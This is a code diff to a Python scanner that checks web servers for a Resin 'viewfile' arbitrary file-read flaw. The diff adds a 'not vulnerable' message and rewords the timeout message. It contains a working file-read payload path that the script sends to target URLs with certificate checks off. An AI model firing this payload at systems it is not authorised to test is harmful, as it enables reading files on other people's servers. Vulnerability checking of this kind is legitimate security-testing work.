@@ -26,14 +26,18 @@ class resin_viewfile_fileread_BaseVerify:
                     "/resin-doc/viewfile/?contextpath=/.&servletpath=&file=index.jsp"]
 
         try:
+            noexist = True
             for payload in payloads:
                 vulnurl = self.url + payload
                 req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                 if r"resin-doc" in req.text and r"caucho.server" in req.text:
                     cprint("[+]存在resin viewfile 任意文件读取漏洞...(高危)\tpayload: "+vulnurl, "red")
+                    noexist = False
+            if noexist:
+                cprint("[-]不存在resin_viewfile_fileread漏洞", "white", "on_grey")
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
